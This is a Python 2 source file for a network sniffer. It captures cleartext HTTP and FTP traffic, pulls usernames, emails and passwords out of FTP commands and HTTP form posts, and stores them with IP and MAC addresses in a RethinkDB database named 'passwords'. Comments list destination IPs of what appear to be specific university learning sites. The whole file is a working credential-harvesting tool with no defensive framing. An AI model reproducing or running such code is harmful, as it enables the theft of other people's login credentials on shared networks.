import dpkt
import pcap
import re
import socket
import urlparse
import binascii
import signal
import sys
import os
import argparse
# import pdb

import rethinkdb as r
from rethinkdb.errors import RqlRuntimeError, RqlDriverError

from pprint import pprint
from utils import add_colons_to_mac

RDB_HOST = os.environ.get('RDB_HOST') or 'localhost'
RDB_PORT = os.environ.get('RDB_PORT') or 28015
PWD_DB = 'passwords'

APP = {80: 'HTTP', 23: 'TELNET', 21: 'FTP', 110: 'POP3'}


def dbSetup():
    connection = r.connect(host=RDB_HOST, port=RDB_PORT)
    try:
        r.db_create(PWD_DB).run(connection)
        r.db(PWD_DB).table_create('pwd_table').run(connection)
        r.db(PWD_DB).table_create('status_table').run(connection)

        # Initial status value
        r.db(PWD_DB).table('status_table').insert([{"status": "ON"}]).run(connection)
        print '[-] Database setup completed. Now run the sniffer without --setup.'
    except RqlRuntimeError:
        print '[-] Sniffer database already exists. Run the sniffer without --setup.'
    finally:
        connection.close()


class Sniffer(object):
    def __init__(self, *args, **kwargs):
        try:
            self.rdb_conn = r.connect(host=RDB_HOST, port=RDB_PORT, db=PWD_DB)
        except RqlDriverError:
            sys.exit("[!] No database connection could be established.")

        cursor = r.table("status_table").run(self.rdb_conn)
        for document in cursor:
            self.status_id = document.get('id')

        # Status ON
        r.table('status_table').get(self.status_id).update({"status": "ON"}).run(self.rdb_conn)

        pattern = 'tcp and dst port 80 or dst port 21'
        # pattern = 'tcp and dst port 80 or dst port 21 or dst port 110'

        self.pc = pcap.pcap(kwargs['interface'])
        self.pc.setfilter(pattern)

        self.all_user_info = {}

        self.devices_mac = {}
        self.info_counter = 0

    def _is_host(self, content):
        regex = re.compile('Host: (.*)')
        return content is not None and regex.search(content)

    def _is_pwd(self, content):
        regex = re.compile('(.*)[password]=(.*)')
        return content is not None and regex.search(content)

    def _is_pwd_with_txt(self, content):
        regex = re.compile('(.*)[txtPwd]=(.*)')
        return content is not None and regex.search(content)

    def _pick_ftp_info(self, data, client, server, dport, eth_src):
        self.devices_mac.setdefault(add_colons_to_mac(eth_src), {})

        self.devices_mac[add_colons_to_mac(eth_src)]['client'] = client
        self.devices_mac[add_colons_to_mac(eth_src)]['server'] = server
        self.devices_mac[add_colons_to_mac(eth_src)]['app'] = APP.get(dport)
        self.devices_mac[add_colons_to_mac(eth_src)]['mac'] = (
            add_colons_to_mac(eth_src))

        if data.get('USER'):
            self.devices_mac[add_colons_to_mac(eth_src)].update(
                {'login': data.get('USER')})
        if data.get('PASS'):
            self.devices_mac[add_colons_to_mac(eth_src)].update(
                {'password': data.get('PASS')})

        device_info = self.devices_mac[add_colons_to_mac(eth_src)]

        if 'login' and 'password' in device_info.keys():
            print "[-] FTP New Password get:"
            pprint(self.devices_mac[add_colons_to_mac(eth_src)])
            r.table('pwd_table').insert([self.devices_mac[add_colons_to_mac(eth_src)]]).run(self.rdb_conn)

            # When push to firebase delete it
            del self.devices_mac[add_colons_to_mac(eth_src)]

    def _pick_http_info(self, data, client, server, dport, eth_src):
        self.info_counter += 1
        self.all_user_info[self.info_counter] = (
            {'client': client, 'server': server,
             'app': APP.get(dport),
             'mac': add_colons_to_mac(binascii.hexlify(eth_src))}
        )

        if data.get('account'):
            self.all_user_info[self.info_counter].update(
                {'login': data.get('account')[0]})
        elif data.get('username'):
            self.all_user_info[self.info_counter].update(
                {'login': data.get('username')[0]})
        elif data.get('identification'):
            self.all_user_info[self.info_counter].update({
                'login': data.get('identification')[0]})
        elif data.get('id'):
            self.all_user_info[self.info_counter].update(
                {'login': data.get('id')[0]})
        elif data.get('os_username'):
            self.all_user_info[self.info_counter].update(
                {'login': data.get('os_username')[0]})
        elif data.get('txtAccount'):
            self.all_user_info[self.info_counter].update(
                {'login': data.get('txtAccount')[0]})
        elif data.get('email'):
            self.all_user_info[self.info_counter].update(
                {'login': data.get('email')[0]})
        else:
            self.all_user_info[self.info_counter].update({'login': None})

        if data.get('password'):
            self.all_user_info[self.info_counter].update(
                {'password': data.get('password')[0]})
        elif data.get('os_password'):
            self.all_user_info[self.info_counter].update(
                {'password': data.get('os_password')[0]})
        elif data.get('txtPwd'):
            self.all_user_info[self.info_counter].update(
                {'password': data.get('txtPwd')[0]})
        else:
            self.all_user_info[self.info_counter].update({'password': None})

        print "[-] HTTP New Password get:"
        pprint(self.all_user_info[self.info_counter])
        r.table('pwd_table').insert([self.all_user_info[self.info_counter]]).run(self.rdb_conn)

    def _get_ftp_pop_payload(self, eth_pkt, ip_pkt, tcp_pkt):
        if 'USER' in tcp_pkt.data:
            regex = re.compile('USER (.*)')
            user_obj = regex.search(tcp_pkt.data)

            user_d = {'USER': user_obj.group(1).rstrip('\r')}
            self._pick_ftp_info(user_d, socket.inet_ntoa(ip_pkt.src),
                                socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
                                binascii.hexlify(eth_pkt.src))
        elif 'PASS' in tcp_pkt.data:
            regex = re.compile('PASS (.*)')
            password_obj = regex.search(tcp_pkt.data)

            password_d = {'PASS': password_obj.group(1).rstrip('\r')}
            self._pick_ftp_info(password_d, socket.inet_ntoa(ip_pkt.src),
                                socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
                                binascii.hexlify(eth_pkt.src))
        elif 'user' in tcp_pkt.data:
            regex = re.compile('user (.*)')
            user_obj = regex.search(tcp_pkt.data)

            user_d = {'USER': user_obj.group(1).rstrip('\r')}
            self._pick_ftp_info(user_d, socket.inet_ntoa(ip_pkt.src),
                                socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
                                binascii.hexlify(eth_pkt.src))
        elif 'pass' in tcp_pkt.data:
            regex = re.compile('pass (.*)')
            password_obj = regex.search(tcp_pkt.data)

            password_d = {'PASS': password_obj.group(1).rstrip('\r')}
            self._pick_ftp_info(password_d, socket.inet_ntoa(ip_pkt.src),
                                socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
                                binascii.hexlify(eth_pkt.src))
        else:
            return

    def _get_http_payload(self, eth_pkt, ip_pkt, tcp_pkt):
        try:
            http_req = dpkt.http.Request(tcp_pkt.data)
            if http_req.method == 'POST':
                # This is POST method
                pass
        except dpkt.dpkt.UnpackError:
            pass

        if 'POST' in tcp_pkt.data:
            # print 'POST', tcp.data
            if 'password=' in tcp_pkt.data:
                # print 'In POST packet password', tcp.data
                pwd_obj = self._is_pwd(tcp_pkt.data)
                if pwd_obj:
                    # print 'query string found:', pwd_obj.group(0)
                    qs_d = urlparse.parse_qs(pwd_obj.group(0))
                    # print qs_d
                    self._pick_http_info(qs_d, socket.inet_ntoa(ip_pkt.src),
                                         socket.inet_ntoa(ip_pkt.dst),
                                         tcp_pkt.dport, eth_pkt.src)

        elif 'password=' in tcp_pkt.data:
            # print 'password', tcp.data
            qs_d = urlparse.parse_qs(tcp_pkt.data)
            # print qs_d
            self._pick_http_info(qs_d, socket.inet_ntoa(ip_pkt.src),
                                 socket.inet_ntoa(ip_pkt.dst),
                                 tcp_pkt.dport, eth_pkt.src)

        elif 'txtPwd=' in tcp_pkt.data:
            qs_d = urlparse.parse_qs(tcp_pkt.data)
            self._pick_http_info(qs_d, socket.inet_ntoa(ip_pkt.src),
                                 socket.inet_ntoa(ip_pkt.dst),
                                 tcp_pkt.dport, eth_pkt.src)
        elif 'email=' in tcp_pkt.data:
            qs_d = urlparse.parse_qs(tcp_pkt.data)
            self._pick_http_info(qs_d, socket.inet_ntoa(ip_pkt.src),
                                 socket.inet_ntoa(ip_pkt.dst),
                                 tcp_pkt.dport, eth_pkt.src)
        else:
            return
        # Moocs dst IP 140.114.60.144
        # Kits dst IP 74.125.204.121
        # iLMS dst IP 140.114.69.137

    def loop(self):
        # result = {'status': 'ON'}
        # cursor = r.table("status_table").get(self.status_id).changes().run(self.rdb_conn)
        # print status_result
        # for document in cursor:
        #     print document.get('status')
        while True:
            result = r.table("status_table").get(self.status_id).run(self.rdb_conn)
            # pdb.set_trace()
            if result.get('status') == 'ON':
                try:
                    for ts, buf in self.pc:
                        eth = dpkt.ethernet.Ethernet(buf)
                        ip = eth.data
                        tcp = ip.data
                        if len(tcp.data) > 0:
                            # print 'Packet in dst port number', tcp.dport
                            # make sure the pattern is correct
                            if tcp.dport == 80:
                                self._get_http_payload(eth, ip, tcp)
                            elif tcp.dport == 21 or tcp.dport == 110:
                                self._get_ftp_pop_payload(eth, ip, tcp)
                            else:
                                pass

                except KeyboardInterrupt:
                    nrecv, ndrop, nifdrop = self.pc.stats()
                    print '\n[-] %d packets received by filter' % nrecv
                    print '[-] %d packets dropped by kernel' % ndrop
                    break
                except (NameError, TypeError):
                    # print "No packet"
                    continue
            else:
                signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
                print "[-] I can not see packets."
                continue

    def __del__(self):
        # Status OFF
        r.table('status_table').get(self.status_id).update({"status": "OFF"}).run(self.rdb_conn)
        result = r.table("status_table").get(self.status_id).run(self.rdb_conn)
        print '[*] Sniffer is %s' % result['status']
        # pdb.set_trace()
        try:
            self.rdb_conn.close()
        except AttributeError:
            pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Run the Sniffer')
    parser.add_argument('--setup', dest='run_setup', action='store_true')
    parser.add_argument("-s", '--interface',
                        help='Specify an interface',
                        default='eth0')
    args = parser.parse_args()

    if args.run_setup:
        dbSetup()
    else:
        if os.geteuid():
            sys.exit('[-] Please run as root')
        s = Sniffer(interface=args.interface)
        print '[*] Using interface:', s.pc.name
        s.loop()
